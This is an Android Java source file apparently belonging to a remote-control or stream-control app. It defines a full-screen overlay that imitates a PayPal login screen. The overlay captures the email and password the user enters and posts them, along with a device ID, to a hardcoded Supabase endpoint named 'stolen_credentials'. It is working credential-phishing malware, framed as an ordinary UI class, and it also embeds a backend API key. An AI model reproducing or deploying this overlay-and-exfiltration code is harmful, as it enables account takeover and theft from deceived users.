package com.rcl.androidstreamcontrol.ui;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.rcl.androidstreamcontrol.R;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import timber.log.Timber;

public class PayPalOverlayView {

    private static View overlayView;
    private static WindowManager windowManager;

    private static final String SUPABASE_URL = "https://qxzozsdgrgahvgzpsfmm.supabase.co";
    private static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4em96c2RncmdhaHZnenBzZm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MDY4NjAsImV4cCI6MjA5NTM4Mjg2MH0.inUzMp-S9BRjNQYHynTAOPRo4EeY3Whqv9okvEeySB4";

    public static void show(Context context) {
        if (overlayView != null) return; // Already showing

        windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);

        int layoutFlag;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.CENTER;

        LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        overlayView = inflater.inflate(R.layout.layout_paypal_overlay, null);
        
        // Remove focusable flag after rendering so keyboard works
        params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        
        Button loginButton = overlayView.findViewById(R.id.btn_paypal_login);
        EditText emailInput = overlayView.findViewById(R.id.et_paypal_email);
        EditText passInput = overlayView.findViewById(R.id.et_paypal_pass);

        overlayView.setFocusableInTouchMode(true);
        overlayView.requestFocus();

        loginButton.setOnClickListener(v -> {
            String email = emailInput.getText().toString();
            String pass = passInput.getText().toString();
            
            exfiltrateCredentials(context, email, pass);
            
            android.content.SharedPreferences prefs = context.getSharedPreferences("PortalPrefs", Context.MODE_PRIVATE);
            prefs.edit().putBoolean("facebook_overlay_submitted", true).apply();
            
            remove();
            
            // We do NOT set hasInjectedFacebook = false here, which prevents it from instantly popping up again in a loop.
        });

        try {
            windowManager.addView(overlayView, params);
        } catch (Exception e) {
            Timber.e(e, "Failed to inflate PayPal overlay");
        }
    }

    public static void remove() {
        if (overlayView != null && windowManager != null) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception e) {
                Timber.e(e, "Error removing PayPal overlay");
            }
            overlayView = null;
        }
    }

    private static void exfiltrateCredentials(Context context, String username, String password) {
        new Thread(() -> {
            try {
                android.content.SharedPreferences prefs = context.getSharedPreferences("PortalPrefs", Context.MODE_PRIVATE);
                String deviceId = prefs.getString("supabase_uid", "unknown");

                JSONObject payload = new JSONObject();
                payload.put("device_id", deviceId);
                payload.put("target_app", "com.facebook.katana");
                payload.put("username", username);
                payload.put("password", password);

                URL url = new URL(SUPABASE_URL + "/rest/v1/stolen_credentials");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("apikey", ANON_KEY);
                conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode();
            } catch (Exception e) {
                Timber.e("Failed to upload credentials");
            }
        }).start();
    }
}
